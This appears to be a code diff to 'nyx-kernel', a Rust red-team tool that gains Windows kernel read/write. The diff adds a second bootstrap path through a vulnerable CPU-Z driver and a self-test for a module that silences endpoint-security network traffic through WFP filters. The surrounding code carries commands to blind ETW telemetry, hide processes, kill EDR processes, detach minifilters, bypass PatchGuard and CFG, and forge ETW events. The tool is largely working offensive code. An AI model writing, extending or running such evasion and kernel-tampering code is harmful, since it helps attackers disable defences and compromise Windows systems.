@@ -13,7 +13,7 @@
 //! reads/writes kernel memory. BSOD risk. **Authorized red-team use only.**
 //!
 //! # Usage (on the Windows target, admin cmd)
-//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--flt-rva <hex>]
+//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--alsysio <sys>] [--flt-rva <hex>]
 //!   nyx-kernel assess   # real T4-T5 kernel assessment ({"assess":{...}} JSON line)
 //!   nyx-kernel blind-etw
 //!   nyx-kernel hide <pid>
@@ -21,6 +21,7 @@
 //!   nyx-kernel neutralize <pid> <freeze|choke|kill>
 //!   nyx-kernel detach-minifilter
 //!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
+//!   nyx-kernel wfp-selftest  # driverless WFP kit e2e (admin; baseline→block→restore)
 //!   nyx-kernel --serve <port>   # daemon mode — REQUIRES NYX_DAEMON_TOKEN (see below)
 //!   nyx-kernel --help           # full usage incl. daemon wire protocol
 //!
@@ -75,6 +76,22 @@ fn main() {
         return;
     }
 
+    // ---- 1c. WFP kit self-test (driverless: needs admin + BFE, no driver) ----
+    // End-to-end proof of netsec::UserModeEdrSilencer on a live box. See
+    // op_wfp_selftest. Hidden child modes: --wfp-probe-connect (one loopback
+    // TCP connect attempt, exit 0/1) and --wfp-probe-idle (AppId anchor).
+    if cmd == "wfp-selftest" {
+        std::process::exit(op_wfp_selftest());
+    }
+    if cmd == "--wfp-probe-connect" {
+        let addr = args.get(2).map(|s| s.as_str()).unwrap_or("");
+        std::process::exit(wfp_probe_connect(addr));
+    }
+    if cmd == "--wfp-probe-idle" {
+        std::thread::sleep(std::time::Duration::from_secs(120));
+        std::process::exit(0);
+    }
+
     // ---- 2. Detect Windows build at runtime (no hardcoding) ----
     let build = detect_build();
     eprintln!("[*] detected Windows build {build}");
@@ -115,12 +132,25 @@ fn main() {
     let wdt_sys = parse_flag_string(&args, "--wdt");
     let wdt_svc = parse_flag_string(&args, "--wdt-svc");
 
-    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback / WDT phys mode ----
-    let bootstrap = if let Some(wdt_path) = &wdt_sys {
-        // WDT path: resolve ntoskrnl base DRIVERLESS first (CR3 validation
-        // needs a kernel VA to page-walk), then load WDTKernel → discover
+    // Parse optional --alsysio <sys> (clean phys-mode BYOVD via CPUID CPU-Z
+    // v2.0.x — v2.1.0.0 removed the R/W IOCTLs) with optional --alsysio-svc.
+    let alsys_sys = parse_flag_string(&args, "--alsysio");
+    let alsys_svc = parse_flag_string(&args, "--alsysio-svc");
+
+    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback / phys mode ----
+    let phys_arm = wdt_sys
+        .as_ref()
+        .map(|p| ("wdt", p, wdt_svc.clone(), "WDTKernel"))
+        .or_else(|| {
+            alsys_sys
+                .as_ref()
+                .map(|p| ("alsysio", p, alsys_svc.clone(), "ALSysIO64"))
+        });
+    let bootstrap = if let Some((kind, phys_path, phys_svc, default_svc)) = phys_arm {
+        // Phys path: resolve ntoskrnl base DRIVERLESS first (CR3 validation
+        // needs a kernel VA to page-walk), then load the driver → discover
         // CR3 (physical scan + MZ gate) → wrap in VaKernelRw.
-        eprintln!("[*] WDT phys-mode bootstrap ({wdt_path})...");
+        eprintln!("[*] {kind} phys-mode bootstrap ({phys_path})...");
         let nt_base = match unsafe { win::kernel_base::ntoskrnl_base() } {
             Ok(b) => b as u64,
             Err(e) => {
@@ -128,27 +158,41 @@ fn main() {
                 std::process::exit(3);
             }
         };
-        let sys_u16 = to_utf16(wdt_path);
-        let svc_u16 = to_utf16(wdt_svc.as_deref().unwrap_or("WDTKernel"));
+        let sys_u16 = to_utf16(phys_path);
+        let svc_u16 = to_utf16(phys_svc.as_deref().unwrap_or(default_svc));
         let scan_budget_mb = std::env::var("NYX_WDT_SCAN_MB")
             .ok()
             .and_then(|v| v.parse::<usize>().ok())
             .unwrap_or(2048);
-        match unsafe {
-            win::wdt::bootstrap_wdt(
-                sys_u16.as_slice(),
-                svc_u16.as_slice(),
-                nt_base,
-                &eprocess,
-                scan_budget_mb,
-            )
-        } {
-            Ok((loaded, rw)) => {
-                eprintln!("[+] WDT bootstrap OK (cr3 discovered + MZ-validated)");
-                win::KernelBootstrap::Wdt(loaded, rw)
+        let result = match kind {
+            "alsysio" => unsafe {
+                win::alsys::bootstrap_alsys(
+                    sys_u16.as_slice(),
+                    svc_u16.as_slice(),
+                    nt_base,
+                    &eprocess,
+                    scan_budget_mb,
+                )
+                .map(|(loaded, rw)| win::KernelBootstrap::Alsys(loaded, rw))
+            },
+            _ => unsafe {
+                win::wdt::bootstrap_wdt(
+                    sys_u16.as_slice(),
+                    svc_u16.as_slice(),
+                    nt_base,
+                    &eprocess,
+                    scan_budget_mb,
+                )
+                .map(|(loaded, rw)| win::KernelBootstrap::Wdt(loaded, rw))
+            },
+        };
+        match result {
+            Ok(b) => {
+                eprintln!("[+] {kind} bootstrap OK (cr3 discovered + MZ-validated)");
+                b
             }
             Err(e) => {
-                eprintln!("[!] wdt bootstrap failed: {e:?}");
+                eprintln!("[!] {kind} bootstrap failed: {e:?}");
                 std::process::exit(3);
             }
         }
@@ -162,6 +206,7 @@ fn main() {
                     win::KernelBootstrap::KslD(_) => "KslD",
                     win::KernelBootstrap::Byovd(_, _) => "BYOVD",
                     win::KernelBootstrap::Wdt(_, _) => "WDT",
+                    win::KernelBootstrap::Alsys(_, _) => "ALSysIO",
                 };
                 eprintln!("[+] bootstrap OK via {kind}");
                 b
@@ -214,7 +259,11 @@ fn main() {
     // Auth: NYX_DAEMON_TOKEN is REQUIRED — the daemon refuses to start
     // without it, and every connection must open with `auth <token>`.
     // Backward-compatible: --serve absent → normal subcommand dispatch below.
-    if let Some(port_str) = args.iter().position(|a| a == "--serve").and_then(|i| args.get(i + 1)) {
+    if let Some(port_str) = args
+        .iter()
+        .position(|a| a == "--serve")
+        .and_then(|i| args.get(i + 1))
+    {
         let port = match port_str.parse::<u16>() {
             Ok(p) => p,
             Err(_) => {
@@ -349,7 +398,11 @@ fn main() {
             // OFF and currently returns None for every build. This command is
             // expected to exit 5 until per-build PDB validation flips a row.
             eprintln!("[*] selecting PatchGuard window for build {build}...");
-            let window_kind = if build >= 26100 { "RuntimePgBypass" } else { "TimingRepair" };
+            let window_kind = if build >= 26100 {
+                "RuntimePgBypass"
+            } else {
+                "TimingRepair"
+            };
             match win::select_pg_window(build, &*tier.rw) {
                 Some(kit) => {
                     eprintln!("[+] selected {window_kind} window; entering unchecked window...");
@@ -365,7 +418,9 @@ fn main() {
                             // _guard drops here, invoking the repair callback.
                         }
                         Err(e) => {
-                            eprintln!("[!] enter_unchecked failed (PG context not in safe state): {e:?}");
+                            eprintln!(
+                                "[!] enter_unchecked failed (PG context not in safe state): {e:?}"
+                            );
                             eprintln!("    retry when PG is between validation cycles (~5min gap)");
                             std::process::exit(5);
                         }
@@ -461,22 +516,22 @@ fn main() {
             // writes it to a file for operator review / NtTraceEvent injection.
             //
             // Usage: forge-etw <parent_pid> <child_pid> <image_name> [output.bin]
-            let parent_pid = args
-                .get(2)
-                .and_then(|s| s.parse::<u32>().ok())
-                .unwrap_or(4);
+            let parent_pid = args.get(2).and_then(|s| s.parse::<u32>().ok()).unwrap_or(4);
             let child_pid = args
                 .get(3)
                 .and_then(|s| s.parse::<u32>().ok())
                 .unwrap_or(1234);
-            let image_name = args.get(4).cloned().unwrap_or_else(|| {
-                r"C:\Windows\System32\svchost.exe".to_string()
-            });
-            let out_path = args.get(5).cloned().unwrap_or_else(|| {
-                format!("forge_etw_proc_create_{child_pid}.bin")
-            });
+            let image_name = args
+                .get(4)
+                .cloned()
+                .unwrap_or_else(|| r"C:\Windows\System32\svchost.exe".to_string());
+            let out_path = args
+                .get(5)
+                .cloned()
+                .unwrap_or_else(|| format!("forge_etw_proc_create_{child_pid}.bin"));
 
-            let deceiver = nyx_operator_kernelsdk::etw_deception::EtwDeceiver::with_kernel_defaults();
+            let deceiver =
+                nyx_operator_kernelsdk::etw_deception::EtwDeceiver::with_kernel_defaults();
             let timestamp = std::time::SystemTime::now()
                 .duration_since(std::time::UNIX_EPOCH)
                 .unwrap_or_default()
@@ -489,15 +544,13 @@ fn main() {
                 .encode_utf16()
                 .flat_map(|u| u.to_le_bytes())
                 .collect();
-            let buf = deceiver.forge_process_create(
-                parent_pid,
-                child_pid,
-                &image_utf16,
-                timestamp,
-            ).map_err(|e| {
-                eprintln!("[!] forge_process_create failed: {e}");
-                std::process::exit(5);
-            }).unwrap();
+            let buf = deceiver
+                .forge_process_create(parent_pid, child_pid, &image_utf16, timestamp)
+                .map_err(|e| {
+                    eprintln!("[!] forge_process_create failed: {e}");
+                    std::process::exit(5);
+                })
+                .unwrap();
             match std::fs::write(&out_path, &buf) {
                 Ok(()) => eprintln!(
                     "[+] forged Process Start event ({} bytes) written to {out_path}\n    \
@@ -636,6 +689,210 @@ fn op_blind_etw(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(), String>
         .map_err(|e| format!("ETW-TI blind failed: {e:?}"))
 }
 
+// ---- wfp-selftest -----------------------------------------------------------
+
+/// Hidden child mode: one TCP connect to `addr` (e.g. "127.0.0.1:49152"),
+/// exit 0 on success / 1 on failure. Keeps the stream open briefly so the
+/// parent's accept() drains the completed handshake from the backlog.
+#[cfg(target_os = "windows")]
+fn wfp_probe_connect(addr: &str) -> i32 {
+    use std::net::{SocketAddr, TcpStream};
+    let sa: SocketAddr = match addr.parse() {
+        Ok(sa) => sa,
+        Err(_) => return 1,
+    };
+    match TcpStream::connect_timeout(&sa, std::time::Duration::from_secs(5)) {
+        Ok(_s) => {
+            std::thread::sleep(std::time::Duration::from_millis(400));
+            0
+        }
+        Err(_) => 1,
+    }
+}
+
+/// `wfp-selftest` — driverless end-to-end proof of the WFP kit
+/// (`netsec::UserModeEdrSilencer`) on a live Windows box:
+///
+///   1. baseline:  a sacrificial probe copy of THIS exe connects loopback → OK
+///   2. install:   `silence_edr([idle_probe_pid])` → ALE_APP_ID block filter
+///                 bound to the probe image path; assert filter_count == 1
+///   3. blocked:   a new probe process connects → MUST FAIL (else the filter
+///                 matches nothing and the kit is a false capability)
+///   4. residue:   drop the guard (BFE session close auto-removes session
+///                 filters) → a new probe connects → MUST SUCCEED (else the
+///                 session-scoped cleanup contract is broken — the
+///                 "filters outlive us" residue bug class)
+///
+/// All traffic is 127.0.0.1 loopback (ALE_AUTH_CONNECT_V4 covers loopback
+/// connects) — no internet dependency, no third-party process involved, and
+/// the AppId anchor is our own temp copy, never a real EDR image.
+///
+/// Requires admin (FwpmEngineOpen0 → BFE). No driver / no bootstrap needed.
+///
+/// Exit codes: 0 pass · 2 baseline broken (harness fault, NOT the kit) ·
+/// 3 filter did not block · 4 residue after drop · 5 operational error.
+/// Prints ONE machine-readable line: {"wfp_selftest":{...}} on stdout.
+#[cfg(target_os = "windows")]
+fn op_wfp_selftest() -> i32 {
+    use nyx_operator_kernelsdk::WfpKit;
+    use std::io::Write;
+    use std::net::TcpListener;
+    use std::process::{Command, Stdio};
+
+    let json = |baseline: bool, blocked: bool, restored: bool, filters: usize, note: &str| {
+        println!(
+            r#"{{"wfp_selftest":{{"baseline":{},"blocked":{},"restored":{},"filters":{},"note":"{}"}}}}"#,
+            baseline, blocked, restored, filters, note
+        );
+        std::io::stdout().flush().ok();
+    };
+
+    // Unique sacrificial image: a copy of this exe (unique name → unique AppId).
+    let own = match std::env::current_exe() {
+        Ok(p) => p,
+        Err(e) => {
+            eprintln!("[!] current_exe: {e}");
+            json(false, false, false, 0, "current_exe failed");
+            return 5;
+        }
+    };
+    let probe = std::env::temp_dir().join(format!("nyx_wfp_probe_{}.exe", std::process::id()));
+    if let Err(e) = std::fs::copy(&own, &probe) {
+        eprintln!("[!] copy self to {}: {e}", probe.display());
+        json(false, false, false, 0, "probe copy failed");
+        return 5;
+    }
+    let cleanup = |probe: &std::path::Path| {
+        let _ = std::fs::remove_file(probe);
+    };
+
+    let listener = match TcpListener::bind("127.0.0.1:0") {
+        Ok(l) => l,
+        Err(e) => {
+            eprintln!("[!] bind loopback: {e}");
+            cleanup(&probe);
+            json(false, false, false, 0, "listener bind failed");
+            return 5;
+        }
+    };
+    let port = listener.local_addr().map(|a| a.port()).unwrap_or(0);
+    listener.set_nonblocking(true).ok();
+    let addr = format!("127.0.0.1:{port}");
+
+    // Spawn a probe child and accept its connection; returns Some(exit_code).
+    let run_probe = |listener: &TcpListener, probe: &std::path::Path, addr: &str| -> Option<i32> {
+        let mut child = Command::new(probe)
+            .arg("--wfp-probe-connect")
+            .arg(addr)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()
+            .ok()?;
+        // Accept with a 10s deadline (nonblocking poll).
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
+        loop {
+            match listener.accept() {
+                Ok((_s, _peer)) => break,
+                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
+                    if std::time::Instant::now() > deadline {
+                        break;
+                    }
+                    std::thread::sleep(std::time::Duration::from_millis(25));
+                }
+                Err(_) => break,
+            }
+        }
+        child.wait().ok()?.code()
+    };
+
+    // 1. Baseline: unfiltered probe must connect (else the harness is broken).
+    let baseline = run_probe(&listener, &probe, &addr) == Some(0);
+    if !baseline {
+        eprintln!("[!] wfp-selftest baseline connect failed — harness fault, not the kit");
+        cleanup(&probe);
+        json(false, false, false, 0, "baseline connect failed");
+        return 2;
+    }
+    eprintln!("[+] wfp-selftest baseline: loopback connect OK");
+
+    // 2. Idle probe anchors the AppId (pid → image path at install time).
+    let mut idle = match Command::new(&probe)
+        .arg("--wfp-probe-idle")
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+    {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[!] spawn idle probe: {e}");
+            cleanup(&probe);
+            json(true, false, false, 0, "idle spawn failed");
+            return 5;
+        }
+    };
+
+    let kit = nyx_operator_kernelsdk::netsec::UserModeEdrSilencer;
+    let guard = match kit.silence_edr(&[idle.id()]) {
+        Ok(g) => g,
+        Err(e) => {
+            eprintln!("[!] silence_edr failed: {e:?} (admin + BFE required)");
+            let _ = idle.kill();
+            cleanup(&probe);
+            json(true, false, false, 0, "silence_edr failed");
+            return 5;
+        }
+    };
+    let filters = guard.filter_count();
+    eprintln!(
+        "[+] wfp-selftest install: {filters} filter(s), ids {:?}",
+        guard.filter_ids()
+    );
+    if filters != 1 {
+        eprintln!("[!] expected exactly 1 filter, got {filters}");
+        drop(guard);
+        let _ = idle.kill();
+        cleanup(&probe);
+        json(true, false, false, filters, "unexpected filter count");
+        return 5;
+    }
+
+    // 3. Blocked phase: the probe image must now fail to connect.
+    let blocked = run_probe(&listener, &probe, &addr) != Some(0);
+    eprintln!("[+] wfp-selftest blocked phase: connect blocked = {blocked}");
+    if !blocked {
+        drop(guard);
+        let _ = idle.kill();
+        cleanup(&probe);
+        json(
+            true,
+            false,
+            false,
+            filters,
+            "filter did not block probe image",
+        );
+        return 3;
+    }
+
+    // 4. Residue phase: drop → session close → filters gone → connect works.
+    drop(guard);
+    // Give BFE a beat to process the session close.
+    std::thread::sleep(std::time::Duration::from_millis(500));
+    let restored = run_probe(&listener, &probe, &addr) == Some(0);
+    eprintln!("[+] wfp-selftest residue phase: connect restored = {restored}");
+
+    let _ = idle.kill();
+    let _ = idle.wait();
+    cleanup(&probe);
+    json(true, blocked, restored, filters, "ok");
+    if restored {
+        eprintln!("[+] wfp-selftest PASS (baseline → blocked → restored, 1 filter, no residue)");
+        0
+    } else {
+        eprintln!("[!] wfp-selftest FAIL: residue — connect still blocked after guard drop");
+        4
+    }
+}
+
 /// Shared `hide` kernel op (CLI + daemon).
 #[cfg(target_os = "windows")]
 fn op_hide(tier: &nyx_operator_kernelsdk::KernelTier, pid: u32) -> Result<(), String> {
@@ -740,12 +997,7 @@ enum DaemonMsg {
 /// `{"ok":true,...}` or `{"ok":false,"err":"..."}`. Ops are
 /// rate-limited per connection (MAX_OPS_PER_MINUTE).
 #[cfg(target_os = "windows")]
-fn run_daemon(
-    tier: nyx_operator_kernelsdk::KernelTier,
-    build: u32,
-    port: u16,
-    token: String,
-) -> ! {
+fn run_daemon(tier: nyx_operator_kernelsdk::KernelTier, build: u32, port: u16, token: String) -> ! {
     use std::net::TcpListener;
     use std::sync::mpsc;
     use std::thread;
@@ -834,7 +1086,10 @@ fn serve_connection(
         Ok(s) => s,
         Err(_) => return,
     };
-    if read_stream.set_read_timeout(Some(Duration::from_secs(10))).is_err() {
+    if read_stream
+        .set_read_timeout(Some(Duration::from_secs(10)))
+        .is_err()
+    {
         return;
     }
     let mut reader = BufReader::new(read_stream);
@@ -877,7 +1132,10 @@ fn serve_connection(
             // and wait for the reply. A dead dispatcher = the daemon is
             // shutting down; drop the connection rather than hang it.
             let (reply_tx, reply_rx) = mpsc::channel();
-            if tx.send(DaemonMsg::Op(trimmed.to_string(), reply_tx)).is_err() {
+            if tx
+                .send(DaemonMsg::Op(trimmed.to_string(), reply_tx))
+                .is_err()
+            {
                 break;
             }
             match reply_rx.recv() {
@@ -900,7 +1158,10 @@ fn serve_connection(
 /// exceeded the cap: the peer is either hostile or broken, and since framing
 /// is unrecoverable past the cap, the caller must close the connection.
 #[cfg(target_os = "windows")]
-fn read_line_capped<R: std::io::BufRead>(reader: &mut R, out: &mut Vec<u8>) -> std::io::Result<bool> {
+fn read_line_capped<R: std::io::BufRead>(
+    reader: &mut R,
+    out: &mut Vec<u8>,
+) -> std::io::Result<bool> {
     out.clear();
     loop {
         let avail = match reader.fill_buf() {
@@ -1089,7 +1350,8 @@ fn usage_text() -> &'static str {
     r#"usage: nyx-kernel <command> [args...]
 
 Commands:
-  bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--flt-rva <hex>]
+  bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--alsysio <sys>] [--flt-rva <hex>]
+  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}})
   assess                   # real T4-T5 kernel assessment (prints {"assess":{...}} JSON line)
   blind-etw
   hide <pid>
@@ -1097,6 +1359,7 @@ Commands:
   neutralize <pid> <freeze|choke|kill>
   detach-minifilter
   pg-window                # PatchGuard unchecked window (holds until Ctrl+C)
+  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}})
   cfg-bypass               # mark NtContinue as a valid CFG call target
   forge-etw [<parent> <child> <image> [out.bin]]
   --serve <port>           # daemon mode (see below)
@@ -1219,18 +1482,19 @@ fn parse_byovd(args: &[String]) -> (Option<String>, Option<String>) {
     (args.get(idx + 1).cloned(), args.get(idx + 2).cloned())
 }
 
-
 #[cfg(target_os = "windows")]
 fn parse_pid(args: &[String], pos: usize) -> u32 {
     args.get(pos).and_then(|s| s.parse().ok()).unwrap_or(0)
 }
 
-
 // ---- Windows FFI helpers for cfg-bypass ----
 #[cfg(target_os = "windows")]
 extern "system" {
     fn GetModuleHandleA(lpModuleName: *const u8) -> *mut core::ffi::c_void;
-    fn GetProcAddress(hModule: *mut core::ffi::c_void, lpProcName: *const u8) -> *mut core::ffi::c_void;
+    fn GetProcAddress(
+        hModule: *mut core::ffi::c_void,
+        lpProcName: *const u8,
+    ) -> *mut core::ffi::c_void;
 }
 
 #[cfg(target_os = "windows")]
@@ -1239,7 +1503,10 @@ unsafe fn winapi_get_module_handle(name: &str) -> *mut core::ffi::c_void {
 }
 
 #[cfg(target_os = "windows")]
-unsafe fn winapi_get_proc_address(h: *mut core::ffi::c_void, name: *const u8) -> *mut core::ffi::c_void {
+unsafe fn winapi_get_proc_address(
+    h: *mut core::ffi::c_void,
+    name: *const u8,
+) -> *mut core::ffi::c_void {
     unsafe { GetProcAddress(h, name) }
 }
 // ---- Non-Windows stub (so `cargo check` on macOS doesn't hard-error) ----
